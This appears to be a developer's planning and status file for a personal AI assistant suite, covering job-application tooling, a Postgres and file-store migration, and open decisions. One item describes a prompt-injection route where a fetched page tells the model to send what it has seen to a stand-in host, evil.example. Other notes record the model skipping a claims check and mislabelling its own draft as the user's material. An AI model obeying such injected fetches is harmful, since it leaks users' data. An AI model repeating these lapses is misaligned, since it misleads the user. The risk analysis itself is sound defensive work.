| Specific subject line requested | The assistant reads the posting and follows it |
| Word format requested | `docu_ai__export` with `format: "docx"` |

### Build order

| Step | What | Depends on |
|---|---|---|
| 1a | web-ai: safety + HTTP fetch | — | **done 2026-10-28**
| 1b | web-ai: operations + MCP server + tests | 1a | **done 2026-10-28**
| 1c | web-ai: registration (tools.yaml, setup, test, Dockerfile) | 1b | **done 2026-10-28**
| 2a | mail-ai: Composition with attachments, multipart build_raw | — | **done 2026-10-29**
| 2b | mail-ai: draft_body reconstruction, fingerprint | 2a | **done 2026-10-29**
| 2c | mail-ai: MCP parameters + review rendering + tests | 2b | **done 2026-10-29**
| 3 | Orchestration descriptions (web-ai, docu-ai, mail-ai) | 1c + 2c | **done 2026-10-30** (with files by path: docu-ai `save_export`, mail-ai `{path}`)
| 4 | End-to-end test on a real application | 3 | **done 2026-10-30**, through the model (see "Built and verified")

Phases 1 and 2 are independent and can be built in parallel. Dossiers come later (needs Postgres).

### Not building

Auto-send; a browsing agent; a workflow engine; a networked apply-ai.

### How we will know it works

Run a real application from nothing but the employer's address. The posting is found; requirements
are extracted; gaps are asked; documents are built and exported as PDF; an email draft with both
attached is made for the user to send through the two-press gate. Look at the output.

---

## Database, caching and multi-user — the architecture plan (2026-10-25)

**Layer 1 is built (2026-10-28); layer 1b (one place for records and files, decided 2026-10-31) and layers 2 to 4 are decided, not built.** Each is its own piece of work;
nothing here is started until the previous one is done and tested. Where layer 1 differs from the text below: the
tests use the existing `asyncio.run` idiom, not `pytest-asyncio` (no new dependency); `DATABASE_URL` is built in
`compose.yaml` from `POSTGRES_PASSWORD` (documented in `.env.example`) rather than written out there; the one-time
import lives in `db.py` and runs when the pool connects; the Postgres tests run only with `TEST_DATABASE_URL`;
and tool processes are started without `DATABASE_URL`.

### Layer 1: PostgreSQL (first)

Replaces the three flat stores (`memory.json`, the in-memory `SessionStore`, `audit.jsonl`) with a
proper database. Also lays the schema for dossiers and multi-user, without building the logic yet.

**Stack:** raw `asyncpg` with numbered SQL migration files (`assistant/migrations/001_initial.sql`,
…). No ORM, no Alembic. A small runner in `assistant/assistant/db.py` creates a `migrations` table,
reads which files have been applied, and runs the rest at startup. The connection is a pool
(`asyncpg.create_pool`), created in the FastAPI lifespan and passed to each store.

**Schema (six tables):**

| Table | Replaces | Used now | Notes |
|---|---|---|---|
| `facts` | `memory.json` | yes | `id TEXT PK`, `user_id UUID FK nullable`, `kind`, `subject`, `content`, `source`, `scope_dossier_id UUID nullable`, `created_at DATE`, `updated_at TIMESTAMPTZ`. kind is CHECK-constrained to the existing set. |
| `sessions` | in-memory dict in `auth.py` | yes | `sid TEXT PK`, `email`, `expires_at TIMESTAMPTZ`. Survives a restart — the user no longer signs in again after a deploy. |
| `audit_log` | `audit.jsonl` | yes | `id BIGSERIAL PK`, `logged_at TIMESTAMPTZ`, `tool`, `arguments`, `outcome`, `error`, `duration_ms INT`, `result`, `origin`, `user_id UUID FK nullable`. Indexed on `logged_at` and `tool`. |
| `users` | nothing | schema only | `id UUID PK`, `email UNIQUE`, `name`. Multi-user adds rows and makes `user_id` required on `facts` / `audit_log`. |
| `dossiers` | nothing | schema only | `id UUID PK`, `user_id UUID FK`, `title`, `status DEFAULT 'active'`. The gap plan's step 5. |
| `dossier_refs` | nothing | schema only | `id UUID PK`, `dossier_id UUID FK`, `kind` (google_doc / gmail_draft / file / url), `value`, `label`, `position INT`. |

`user_id` is nullable on `facts` and `audit_log` for now; when multi-user lands it becomes required
and existing rows get assigned to the first user.

**Store abstractions.** Each store becomes an ABC with async methods and two implementations:

- `MemoryStore` → `FileMemoryStore` (the current file-based one, kept for tests) + `PgMemoryStore`.
- `SessionStore` → `MemorySessionStore` (the current in-memory one, kept for tests) + `PgSessionStore`.
  Pending OAuth state (10-minute-lived) stays in memory in both; only the 7-day session goes to Postgres.
- `AuditStore` → `FileAuditStore` (the current JSONL one, kept for tests) + `PgAuditStore`.

Which implementation runs is decided by whether `DATABASE_URL` is set: the container sets it, the
test runner does not.

**The async transition.** Moving to asyncpg makes the store methods async, which ripples through:

- `LocalTool.handler` becomes `async` (one-word change in `ToolRegistry.call`, which already awaits
  remote tools).
- `prepare()` becomes `async` (called in the async lifespan).
- `refresh_context` becomes `async` (called in `Hub.run`, which is async).
- `audit.record()` becomes `async` (called from `execute`, which is async).
- `builtins.py` handlers (`_remember`, `_forget`, `_recall`) become `async`.

Tests use `FileMemoryStore` / `FileAuditStore` / `MemorySessionStore`, which are `async def` wrappers
around sync file I/O. Tests add `pytest-asyncio` as a dev dependency.

**Data migration from files.** At first startup the backend checks for `data/assistant/memory.json`
and `data/assistant/audit.jsonl`. If they exist it imports their contents into Postgres and renames
them to `.imported`. Runs once, automatically, inside the migration runner.

**Infrastructure:**

- `compose.yaml`: a `postgres:16-alpine` service, a volume at `./data/postgres`, the backend
  `depends_on` it with `condition: service_healthy`.
- `assistant/requirements.txt`: add `asyncpg`.
- `.env.example`: add `DATABASE_URL=postgres://suite:suite@postgres:5432/suite`.
- `docker/backend.Dockerfile`: no system-level changes (asyncpg is pure Python).
- `./start`: becomes `./auth` then `exec ./start-docker up "$@"`. The host-only path is dropped
  (locked decision 10).

**What does not change:** tools (still MCP child processes), the web app, the API shape (no frontend
changes), the `./test` script, and the rule that no tool reads memory.

### Layer 1b: one place for records and files (decided 2026-10-31, the user's call; not built)

**Decided.** (1) Every record and every piece of text goes in PostgreSQL. (2) Audio, and any other file that is not
text, stays a file, but in **one** file store for the whole suite, not in each tool's folder. (3) There are **no
per-user folders on disk.** A file on the user's Google Drive is that user's own folder and stays there (the database
holds its Drive id and link, never a copy). Everything else the system keeps for a user is a row with a `user_id`,
and a file's owner is a column, never a folder name. This replaces layer 3's "per-user uploads folders".

**Where things live today** (measured 2026-10-31):

| What | Where now | Size | Goes to |
|---|---|---|---|
| Memory facts, audit log, sessions | Postgres | 16 facts, 859 audit rows | already there |
| Uploaded books (PDF), recordings (webm), CV and letter folders | `data/assistant/uploads/` | 6.3 MB | file store |
| Audiobook chapter text and plan (`plan.json`, `preview.md`) | `data/audiobook/output/<book>/` | about 550 KB for the book checked | database |
| Audiobook audio (86 mp3, 1 m4b) | `data/audiobook/output/` | 539 MB | file store |
| Voices: 3 samples, 3 model states, 2 metadata files | `data/audiobook/voices/` | 49 MB | files to the store, metadata to the database |
| Audiobook jobs (10 records, 10 logs) | `data/audiobook/jobs/` | 0.6 MB | database |
| Meeting audio (2 flac, 1 m4a, 2 small json) | `data/meet-ai/audio/` | 115 MB | file store |
| Transcripts and timelines (7 md, 9 json, 4 logs) | `data/meet-ai/transcripts/` | 0.5 MB | database (the timeline as JSON) |
| The mailbox (4,383 messages) | `data/mail-ai/mailbox.sqlite3` | 34 MB | database |
| Built-document exports for email | `assistant/uploads/exports/` (empty today) | 0 | file store |
| Spoken-chunk cache and Docling's cache | `data/audiobook/cache/` | 7.4 GB (5,584 sentences) and 8 MB on the evening of 10-31; 4.5 GB that morning, before the running render added to it | stays: a cache |
| Whisper and Pocket TTS models | `data/cache/huggingface` | 1.8 GB | stays: downloads |
| Google logins | `data/config`, each tool's `credentials.json` | about 40 KB | stays with its tool (the suite's rule) |

**The design.**

- **Database.** New numbered migrations, one per phase: `files`; then `books`, `chapters`, `voices`, `jobs`;
  `recordings`, `transcripts` (with notes and minutes); `mail_messages`, `mail_sync`; `documents`. The names are
  proposals: each phase reads the real data and the tool's own rules first, then writes its migration. Every table
  has `user_id`, nullable until layer 3 makes it required, as `facts` has.
- **File store.** One root, `data/files/`. **A file is kept at `<id>/<its own name>`**, not under its content hash
  as first written here: tools use the name (docu-ai titles a Doc after its folder, audiobook names a book's audio
  after its PDF, meet-ai a transcript after its recording), so it must survive exactly, and a folder per id keeps it
  even when the same name is uploaded twice. One `files` row per file: `id`, `user_id`, `kind`, `name`, `bytes`,
  `sha256`, `made_by` (user or assistant), `created_at` (`assistant/migrations/002_files.sql`). Local disk now; an
  S3-style store later for a server is possible, not decided and not built. The API serves a file by its id
  (`/api/files/<id>`), which is to replace serving by path from folders a tool declares (`files:` in `tools.yaml`,
  `media_roots`) in phase B: an id says nothing about where a file is.
- **How a tool reaches it: the assistant owns all of it (the user, 2026-10-31).** "The assistant" here is the backend program,
  not the model: it runs with no model login or key, and every button already reaches its tool through it
  (`/api/actions`), so this adds no dependence on the model. A tool never opens the database or the file
  store. It works in its own scratch folder (working files and caches, safe to lose). When a job finishes, the
  assistant takes what the job made, puts the files in the store and writes the rows. To give a tool a file to read,
  the assistant hands it a path to a read-only copy (the local-disk store can give a real path; an S3-style store
  would copy to scratch first). So "a path is all any tool takes" still holds, no tool changes its contract, no tool
  gets `DATABASE_URL`, and the check on who owns what is made in one place. What it needs: each tool says what a job
  produced. The audiobook and meeting jobs already record their outputs in their job files (to be checked per tool).
- **Uploaded markdown goes into the database (the user, 2026-10-31).** The text itself goes in, not just a record of
  the file, so the database holds its only lasting copy, and docu-ai and apply-ai read it from there: for each call
  that names one, the assistant writes a read-only copy from the database and removes it when the call ends. The
  user was told exactly that ("the copy is deleted afterwards"), so the copy is never a second place it lives.
- **What stays out, on purpose.** Google logins (they stay with their tool). Caches that can be rebuilt: the
  spoken-chunk cache (a stopped render loses nothing because of it) and Docling's cache (kept so a re-uploaded book is
  already read), and the model downloads. Google Docs themselves (the user's own Drive).

**Phases.** Each is its own piece of work; nothing starts until the one before is done, tested on the real data and
approved.

1. **A. The file store. Built 2026-10-31 and 11-01, deployed 2026-11-01** (see "Built and verified"). The `files` and
   `file_texts` migrations, the store (`assistant/assistant/files.py`), uploads into it, markdown (uploads and drafts)
   into the database and lent to a tool for one call (`texts.py`), delete and serve by id, and the old uploads folder
   copied in once on start (2 recordings, 4 books, 4 draft folders on the real data). No tool changed; apply-ai reads
   only where documents are lent.
2. **B. Audiobooks. Built and deployed 2026-11-01** (see "Built and verified"), in shape A (question 6): finished
   audio, voice samples and voices into the store; records with labels and text (each chapter's exact words from
   now on), voices, corrections and jobs into the database; the Audiobooks page reads them and plays by file id. On
   its first start it takes in the 105 audio files already there, checked by hash, and the tool lets go of them.
3. **C. Meetings.** Recordings to the store; transcripts, timelines, notes and minutes to the database.
4. **D. Mail.** The mailbox out of SQLite and into Postgres. The hard one: mail-ai's own search and thread listing
   run over that file (`mailai/store.py`), so if the assistant owns the data those queries must move out of mail-ai,
   or mail-ai needs its own database login limited to its own tables (question 2).
5. **E. Documents.** Built-document records (Drive id, title, source text, builds) in the database; `save_export`
   writes into the file store, and mail-ai attaches by path as now (decision 13 stands).
6. **F. Multi-user (layer 3).** `user_id` required everywhere. Nothing per-user is left to move on disk.
7. **G. The old folders** deleted, each only when the user says so.

**Rules for every phase.** The Postgres precedent: a one-time import per source, never overwriting, checked by counts
and hashes against the old files, the old ones renamed `.imported` and deleted only when the user says. `./test` still
needs no database and no network (a temp-folder file store and in-memory stores, as now). Run for real on the real
data. A container restart interrupts a running render, so nothing is deployed while one is going. **From phase A a
backup must take `data/postgres` and `data/files` together**: the database alone would keep the records and lose the
audio. `CLAUDE.md`'s "All state is in `./data`" and "the tools keep their own files" change when phases A and B land,
not before.

**Needs the user's answer.**

1. **Who writes? Answered 2026-10-31: the assistant owns the data, and no tool gets the database.** The user's worry
   was a tool depending on the model (an expired key); it does not, since the backend runs without one.
2. **Mail (before D).** Same question for mail-ai, which queries its own store. Its notes name a full resync as the
   fallback, so the mailbox looks rebuildable from Gmail; confirm that before treating the SQLite file as
   disposable.
3. **The spoken-chunk cache (7.4 GB) stays a cache in the audiobook folder. Answered yes, 2026-10-31.** Not in the
   database or the store.
4. **Local disk for the file store now, an S3-style store later** if it moves to a server (recommended). Needed
   before A.
5. **Order: A, then B** (recommended: audiobooks, because that is where this came from).
6. **Phase B: where the knowledge of what a book is lives. Answered 2026-11-01: A, general records.** The tool
   labels what it made; the assistant files it under those labels without knowing what a book is; the page,
   which does know, reads them back. The same pattern for meetings (C) and mail (D). Explained to the user as a
   workshop (the tool, working at its own bench) and a warehouse (the store and the database).

**Phase B design (proposed 2026-11-01, not built).** Measured on the real data first:

- **What audiobook keeps.** `output/<pdf name>/`: 86 MP3s and 1 M4B (655 MB with the voice samples), `plan.json`,
  `preview.md` and `render.log` for some books, and stale MP3s from earlier readings (Dreams and Visions holds two
  numberings side by side). `output/voices/`: 2 sample MP3s. `voices/`: 3 sample WAVs, 3 voice states
  (`.safetensors`), 2 records (source recording, window, similarity, date; neither holds a consent statement:
  both predate it). `voice/`: the 2 recordings voices were cloned from. `jobs/`: 12 jobs, a JSON and a log each
  (792 KB). The caches (7.4 GB speech, 8 MB Docling) stay (answered).
- **How it works.** A render is a detached process that runs for hours after the call that started it; it reads
  the PDF, the corrections beside it and the voice by name when it starts, writes each chapter's MP3 as it
  finishes, and the finished job lists its outputs (paths). The book's chapters and their exact text are worked
  out on demand from Docling's cache and the corrections. The Audiobooks page asks the tool for everything (14
  tools) and plays files by path from `output/`.
- **What must hold.** Records and text in the database, audio in the store (the user). No tool gets the database
  (answered). **A tool still works on its own** (the user: "i dont want any tool to rely on the assistant to
  function"; and the suite's rule that every tool runs alone). And the assistant's own rule: no domain logic,
  so it must not need to know what a chapter is.

**Recommended shape:**

1. **The tool keeps working in its own folders**, alone or in the suite. In the suite they are its working space:
   finished audio stays there only until the assistant has taken it.
2. **When a job finishes, the assistant takes what it made without knowing what it is.** The tool says, in a
   general shape, which files the job produced and what each is (labels such as book, chapter, title, speed,
   voice) and which records go with them (each chapter's exact spoken text, a voice's consent and source).
   The assistant puts each file in the store and each record in one general table (tool, kind, key, labels,
   text, the files it goes with), never reading inside them, then has the tool remove its copies. The watcher
   that already notices a finished job is where this starts.
3. **The page reads the database and plays by file id.** The page knows what a book is; the assistant does not.
   It joins the tool's chapters (still worked out by the tool) with the stored audio by chapter.
4. **What the tool needs to keep working stays a working copy**: a book's corrections and the voices. Their
   lasting copy is in the database and the store (the page saves both, the tool's own copy and the record).
5. **The existing audio is taken in once**, checked by hash, as the uploads were; the stale MP3s are kept as
   "from an earlier reading", never deleted unasked.

**How A works, concretely (the build, in this order):**

- **Two agreed tool names, like `login_status`.** A tool that keeps things worth keeping offers a read-only
  `inventory` (everything it holds that the warehouse should keep, each item `{kind, key, labels, text, version,
  files: [{path, role}], release}`) and a `release` (delete these working copies, each named by path and the
  SHA-256 the assistant filed; the tool checks the hash before deleting, so only a filed copy can go). Only the
  names are agreed; a tool without them is not asked.
- **The assistant collects** (`collect.py`): on start (which is also the one-time import of what is already
  there), when the watcher sees one of the tool's jobs finish, and after any call to the tool that changed
  something. An item whose version it already has is skipped. Otherwise each file is copied into the store
  (checked by hash), the record is written or replaced under (tool, kind, key), a replaced record's old files
  leave the store, and items marked `release` are released. One collection at a time.
- **The database:** `records` (tool, kind, key unique together; labels as JSON; text; version; dates; `user_id`)
  and `record_files` (which stored file plays which role); `files` gains the kind `made` (by a tool), never shown
  among uploads. Generic endpoints for the page: list records by tool and kind, read one with its text, delete
  some (and their files, audited). A read-only local tool lets the model see them too, since `preview_book`
  stops listing audio the tool no longer holds.
- **audiobook's items:** a chapter's MP3 (labels: book, PDF, number, title, speed, voice; the text is exactly
  what that chapter says; released), the whole-book M4B (released), a voice sample MP3 (released), a voice (its
  record, sample and state; kept as the tool's working copy, which it needs to render), a book's corrections
  (text; kept beside the PDF, which the tool reads), each finished job (its labels and log; kept: small, and
  `job_status` reads them). A chapter of a render still running is collected once its MP3 is finished, so it
  can be played before the book is done, as now.
- **The page** lists finished audio from the records, joins them to the tool's chapters by number and title
  (what the tool's own matching did), plays and downloads by file id, and deletes a book's audio through the
  records.

**The alternative** is tables named for the domain (`books`, `chapters`, `voices`, `jobs`) in the assistant:
easier to query, but the assistant then knows what a chapter is, and every change to audiobook's data needs a
migration in the assistant. The same choice comes back for meetings (C) and mail (D).

### Layer 2: Redis (deferred to layer 3 on 2026-10-29, the user's call)

**Not built, and not to be built before multi-user.** Measured on 2026-10-29 on a throwaway Postgres loaded with a
copy of the real audit log (707 rows), over loopback, median of 200 runs (50 for history): a session lookup 1.0 ms,
`/api/status` (`last_by_server()`) 3.7 ms, `/api/history?limit=2000` 9.8 ms plus 2.8 ms to encode a 272 KB body.
What that showed:

- The Overview polls status and history every 30 s (the History page every 15 s), not "every few seconds". Redis
  would save about 27 ms of query time a minute while the Overview is open, less its own round trip (not measured:
  no Redis was run).
- The totals and charts are worked out in the browser from raw rows (`web/src/pages/overviewData.ts`, used by `Overview.tsx`), so the server
  has no summary to cache. The cost that is real is the 272 KB sent each poll, which Redis does not change.
- Sessions are looked up only when Google sign-in is configured, which is not deployed; the launch-token path
  never reads the database.
- The two jobs that are real need later layers: rate limiting needs several users (layer 3), the embedding cache
  needs RAG (layer 4).
- **Watch:** `last_by_server()` reads the whole audit table on every call. Not timed on a larger table, and it may
  have a cheaper fix than Redis (an index, or a narrower query). Time it before reaching for a cache.

Revisit when layer 3 gives Redis a job. The text below is the plan as written on 2026-10-25, unchanged.

A cache layer. Solves repeated work across requests and things that are expensive to recompute but
fine to lose on restart.

**What goes in it:**

- **Session lookup.** The primary session lives in Postgres (survives restarts); Redis holds a fast
  copy so every `/api/*` request does not hit the database. Evict on logout, expire with the session.
- **Tool status.** The web app polls `/api/status` every few seconds. Cache the result for 10–30 s.
- **Audit summaries.** The Overview dashboard's KPIs, sparklines and activity-by-tool charts. Today
  every page load parses the whole JSONL (or, after layer 1, queries every row). Redis caches the
  aggregated result; invalidate on a new audit row.
- **Rate limiting.** Per-user rate limit on chat turns once there are multiple users, since each turn
  costs a model call.
- **Embedding cache (later).** When RAG arrives, cache the vector for a query string so repeated
  queries do not re-embed.

**What it does not cache:** model responses. Each turn depends on the full conversation; a stale
cached answer is worse than a slow one. Anthropic's own prompt caching on Bedrock handles the
expensive part.

**Infrastructure:** a `redis:7-alpine` service in `compose.yaml`, no persistence (`--save ""`), a
volume is not needed. The backend takes `REDIS_URL` and falls back to no caching if it is unset
(tests, development).

### Layer 3: multi-user (next, after Postgres; Redis comes with it, see layer 2)

With Postgres holding sessions and facts per user, and the Google sign-in already built
(`assistant/CLAUDE.md`, "Authentication"), the remaining work is:

- A `users` table row created on first Google sign-in for an allowed email.
- `user_id` becomes required on `facts`, `dossiers`, `audit_log`.
- No per-user folders (decision 11, layer 1b): a file's owner is `user_id` on its `files` row, and its text is in the database.
- The model's context (`as_prompt_block`) is scoped to the signed-in user.
- `ASSISTANT_ALLOWED_EMAILS` grows from one address to a list.

### Layer 4: RAG (last, when the data outgrows the prompt)

Not until the fact count makes "send everything" too expensive or too noisy. The seam is already
there: `MemoryStore.relevant()` returns everything today, and its docstring says to narrow it only
when the prompt gets too big.

- A `pgvector` extension on the existing Postgres (no second database, no Pinecone, no Weaviate).
- An `embedding VECTOR(1024)` column on the `facts` table.
- A small, fast embedding model (Cohere `embed-english-v3.0` or Anthropic's own when available).
- `relevant(query)` goes from "return everything" to "embed the query, top-k by cosine similarity,
  always include spelling facts and active-dossier facts."
- `as_prompt_block` still produces the same shaped string; the model never knows the retrieval
  changed.

### Not building

- A separate vector database (Pinecone, Weaviate, Qdrant) — pgvector on the existing Postgres is
  enough at this scale and avoids a third service.
- An ORM (SQLAlchemy, Django ORM) — raw asyncpg with numbered SQL files is simpler and this is not
  Django.
- SQLite as a fallback for the host — there is no host path (locked decision 10).
- Caching model responses — each turn is contextual and a stale cache is worse than a slow one.

## Still open (not part of the database plan)

- **Teaching the system to tailor a CV to a posting: built 2026-10-15** (the user's go-ahead; it had been pinned
  until the applications closed). What was built, and why, is in `apply-ai/CLAUDE.md`, `docu-ai/CLAUDE.md` →
  "Layout" and `CLAUDE.md` → "Tailoring a CV". **Still open:**
  - The claims check is **advisory**. A model can skip it (the second run re-checked after fixing findings but
    not after a trim, so the tool's description now says to re-check after any edit), and it cannot tell that a
    sentence is true: a real draft passed with "dashboards" for one dashboard and "specializations" for one
    course. Making it unavoidable would mean the approval preview of `write_draft` calling it, which needs the
    assistant to name a tool or `write_draft` to move into apply-ai; neither was done.
  - **Existing drafts have no `.draft` marker** (the real `CV - …` and `Cover Letter - …` folders in
    `assistant/uploads/docs`), so a model can still pass them as the user's material. Mark them by hand, or ask.
    **It happened on 2026-10-30:** `CV - ML Engineer` (the assistant's own, written 2026-09-28 per the audit log)
    was read and passed to `requirements` as the user's material until the user said otherwise. It was marked the
    same day. The host copies under `assistant/uploads/docs`, which nothing reads now, were not.
  - **The model asks to remember instructions as facts** (2026-10-30). Told "leave out published research" and
    "leave it out unless my CV shows it", it asked to remember "no published research" and "no … experience beyond
    what CV shows" as facts about the user, and three spellings of the referrer's name nobody gave. Both declined
    at the gate; only the person approving stops it. **Changed the same day, the user's go-ahead:** `remember`'s
    description now says an instruction about a draft is not a fact about the user, and a spelling records only
    forms the user gave or a transcript showed (a test pins the wording). Live since the evening's rebuild; **not
    yet tried through the model.**
  - **What the claims check did not see** (2026-10-30): a sweeping sentence with no figure, tool or watched word
    passed ("AI for Africans, by Africans — is work I have spent my career doing"), and the email body was never
    checked. **Both addressed the same day** (see "Built and verified"): "spent my career" is watched, and the model
    checked an email body unasked. Still true: a sweeping claim worded any other way passes, since the list is
    literal.
  - **A line the user dictates is not re-checked** (2026-10-30). Asked to add "my repositories are private ... as
    my CV says", the model went straight to `draft_new`; the check would have caught it (shown when asked). The
    check stays advisory: only the person approving stops this. **Nor is a letter only shown in chat**: asked to
    show one, not save it, the model skipped the check and said "nothing invented" over a "resonates directly"
    the check then flagged. Its description tied the check to `write_draft` and `draft_new`. **Changed the same
    day, the user's go-ahead:** it now says to run on every draft before it is shown to the user, and again after
    a line the user asks to add. Live since the evening's rebuild; **not yet tried through the model.**
  - **A spelling fact rewrote the employer's name** (2026-10-30): memory's `AyaData` spelling turned the CV's
    "Ayadata GH" into "AyaData GH". The CVs already sent say "Ayadata". **Fixed the same day** (the user: "Ayadata
    GH is right"): the spelling fact and the two experience facts now say `Ayadata`.
  - A failed build still leaves a stray Doc (a letter with no `# heading` failed in docu-ai after creating it).
  - Letters: the model chose the `technical` look and needed four drafts to fit one page; the `resume` look
    then made them cramped (the user: "ugly, not well formatted"). docu-ai now has a `letter` look (10.5pt, 115%
    spacing, 10pt between blocks, inch side margins): a real letter that spilled onto a second page in the CV
    look sits on one page with room to spare. Built and looked at; **the running containers need
    `./start-docker up` before chat will offer it**. A letter has no date line or room for a signature: the
    markdown cannot express a gap, and the model does not know today's date.
  - The web app does not know the new tool: Settings lists it with the default colour and nothing links to it.
  - Only CVs and cover letters. Meeting minutes already have a quote rule; generalise when a second field
    needs the same piece.
- **Storage for file uploads, and the rest.** Today `assistant/uploads/` is a local folder
  (`assistant/CLAUDE.md`, Uploads). **Decided 2026-10-31: one central file store and the database, no per-user
  folders** (layer 1b above; phase A built, not deployed).
- **User authentication.** The Google sign-in is built but not deployed (locked decision 9;
  `assistant/CLAUDE.md`, "Authentication"). Multi-user is layer 3 above.

## Waiting on the user

Decisions or input only the user can give. Don't guess these.

0. **Deployed 2026-11-01** (the user's yes), once the Myles Munroe render had finished (`[exit 0]`), with nothing else
   running: 2026-10-31's work and layer 1b phase A. Checked live: the backend copied in 2 recordings, 4 books and 4
   drafts (into the database) and renamed the old folders `.imported`; migrations 002 and 003 applied; each book's PDF
   in `data/files` is byte-identical to its original; the tool still finds every book at its new path, read, with its
   audio. Still open: **re-render Dreams and Visions** so its chapters get the new openings (the text is cached, so it
   is the title chunks and the encode), and put an `ANTHROPIC_API_KEY` in `.env` before the end of November (Bedrock
   ends then): `./auth --check` and Settings then say whether the key and `claude-opus-5-5` are accepted. **The Myles
   Munroe book was read as two chapters** ("Opening" and a 6 h 40 min "Introduction"): its chapters were not found.
0b. **Layer 1b phase B is deployed (2026-11-01).** The backup `data/audiobook/output.before-phase-b` (802 MB: every original
   file as it was before) stays until the user says to delete it, as does `data/assistant/uploads/*.imported` from phase A.

1. **Correct spellings** for the association meeting (places, officers, members, visitors — listed
   in the 2026-09-26 conversation; the minutes' footer flags them). Then: teach them with
   `assistant__remember` (kind `spelling`) and regenerate that meeting's notes and minutes once.
2. **Deployment: pinned 2026-10-14, the user's call — build none of it until they say so**
   (locked decision 7): a company EC2 instance
   (`i-0fa9e2caeda028982`, which the user may use), nginx with basic auth, then Google sign-in. Needed
   from the user: how the instance is reached (the ssh alias and the AWS profile for SSM; the login
   the assistant has, `ayadata-bedrock`, cannot see EC2 or SSM, and the user's admin profiles were not
   tried), its OS and size, and which inbound ports its security group already allows (the user
   cannot change it). A server has no microphone, so recording would move into the browser. `./renew-secrets`
   is built and tested against a stand-in for ssh, **not yet against the instance**.
3. **The old folders** `~/Documents/{assistant,meet-ai,mail-ai,docu-ai}` still exist (~1.2 GB, all
   content now in `suite/`), and so does `~/Documents/audiobook` (3.4 GB, mostly its old `.venv` and
   caches, which were copied here). Delete only when the user says so. Committing in them would push
   to the old repos — don't.
4. **`docu-ai/plan.md` has the user's own uncommitted edit.** Never stage it; commit it only if asked.
5. **Start at login** as a background service, or keep running `./start` by hand. Undecided.
6. ~~**Host or container: which is used day to day?**~~ Decided 2026-10-25: containers (locked decision 10).
7. ~~**Step 5 of the gap plan:** generic dossiers with a database, or something lighter first?~~ Decided
   2026-10-25: Postgres, with the full dossier schema ready from the start. See "Database, caching and
   multi-user" above.
8. ~~**Step 3:** may the suite have a tool that fetches arbitrary web pages, with the limits listed there?~~ Decided
   2026-10-25: yes. The job application workflow is the driving use case — see "Job application workflow" above.
9. ~~**Steps 1 and 2** touch docu-ai and mail-ai: is one yes enough, or does each need approving?~~ **Decided 2026-10-29, the user's call: each separately.** Step 1 (docu-ai) is approved. **Step 2 (mail-ai) approved 2026-10-29**, after the user had seen the tests for the send check (attachments inside what a review covers), and built (see "Built and verified").
10. ~~**The public history of `suite`.**~~ **Decided 2026-10-30, the user's call: leave it.** Checked that day: the
    commit emails (philip@ayadata.ai on 97 commits, the personal Gmail on 1), the instance id in this file, the
    three applications' names and CV details in apply-ai's tests are in it; the phone number, the recruiter's and
    referrer's names and any secret are not. Original question: A few non-secret details are in it (a server id, a person's name, the names
    of earlier applications, commit emails). Removing them from history means rewriting `main` and a force-push,
    and copies may already exist. Remove, or leave?
11. ~~**Should a fetch be held for approval?**~~ **Decided 2026-10-29, the user's call: no, leave web-ai's tools ungated.** The risk stays as written in `web-ai/CLAUDE.md` ("What this does not stop"). Original question: `web-ai`'s tools are read-only, so the assistant's gate never stops one. A GET can carry data out in its address (a page the model read could tell it to fetch `https://evil.example/?q=<what it has seen>`); the 2048-character limit bounds one call, it does not stop it. Marking the tools as writes would make the assistant ask before every fetch. Reasoned, not demonstrated. Gate them, or leave them as the plan says?
12. **A headless-browser fallback for script-built pages?** Open; recommendation given 2026-10-29: not yet. A browser runs a page's scripts, which make requests the address checks do not cover, so it would need every request checked or its own isolated container, which is a project, not an extra; the 2026-10-24 posting was script-driven but was read through the site's own JSON API, which `read_page` can already return. Build it, as its own container, if a second real posting needs it. Not built: it would add a browser to the backend image and a surface that runs a page's scripts. Today such a page comes back nearly empty with a warning and the user pastes the text. Build it when a real posting needs it, or now?

13. ~~**How do a file's bytes reach `draft_new`?**~~ **Decided 2026-10-30, the user's call: by path** (built; see "Built and verified"). Option (a) could not work, by arithmetic: one model reply holds 16,000 tokens (`MAX_TOKENS`), and the smallest real file, a cover-letter PDF, is at least 17,000 as base64; each Word file at least 217,000. The 10 MB total cap was taken with it. The original question: Open (asked 2026-10-29). Today `docu_ai__export` returns the whole file as base64 text and a model would copy it into `draft_new`. Measured on the real files: the CV PDF is 96,898 bytes and the cover-letter PDF 51,311 (about 200,000 characters of base64 for the pair), and each Word file is about 650,000 bytes, not the ~300 KB assumed in the job-application section. Whether a model can copy that without changing a character has **not** been tested. (a) Keep base64 and try it on the real CV and letter through the chat: if the attached file matches `export`'s byte for byte, it stands. (b) Name a file in one allowed folder and let mail-ai read it: nothing in the assistant saves an exported file there today (the PDFs in `assistant/uploads/docs` were written by hand with docu-ai's command line), so docu-ai's `export` would have to, which is a docu-ai change needing its own yes. Recommendation: (a) first, (b) if the bytes come back wrong. (a) needs a draft made in the real Gmail, which writes to the real mailbox, so it needs the user's yes, and a live `mail-compose` login. Also undecided: a size cap on attachments (suggested: 10 MB in total).

## Next steps, in order

0. **The voice plan, then the rename and the portfolio (2026-11-06, the user's order).** Done: past conversations
   (`aa099bc`), dictation (`4b1eb91`), replies read aloud (see "Built and verified"). None of it is deployed: it needs
   `./start-docker up`, which interrupts a running render, and the containers' cache will download base.en once.
   Still to do, in order:
   - **Faster audiobook renders.** Measured 2026-11-06 with abigail: 8-bit 2.0x real time against 1.38x (a 10-hour
     book from about 7.2 h to 5 h), two copies at once 2.84x in all (about 3.5 h; a third copy adds nothing, about
     0.85 GB each), likeness 0.953 against 0.957, every word right. The chunk cache must keep 8-bit and full-model
     pieces apart, or one chapter mixes them. The user was given the two samples to listen to first.
   - **Rename `suite` to `shelby`, everything** (the user's choice): the folder, Docker's names, the `SUITE_` settings
     in `.env`, the Tailscale address (the phone's bookmark changes), the GitHub repo (GitHub forwards the old link,
     which CVs already sent carry) and the docs. Python environments are rebuilt (`./setup`) and Claude's notes for
     this folder are keyed by its path. **Just before the portfolio** (the user's choice).
   - **The portfolio, last** (`~/Documents/portfolio`, live at philip-portfolio-five.vercel.app, unchanged since
     2026-09-11): the suite replaces docu-ai's case study (the user's choice), after it is added to the résumé, which is
     the site's only source of facts. Also there: four sections drafted by an earlier session and never confirmed
     (three "What I'd do differently" and the voice survey's results), shown as the user's own words; a résumé PDF
     from 9 Sep when the text changed on 14 Oct; and two repos public that the site's rules said to keep private
     (`personal-ai-main`, whose README says the Ayadata team built it, and `voice-ai-survey-platform`): the user's call.
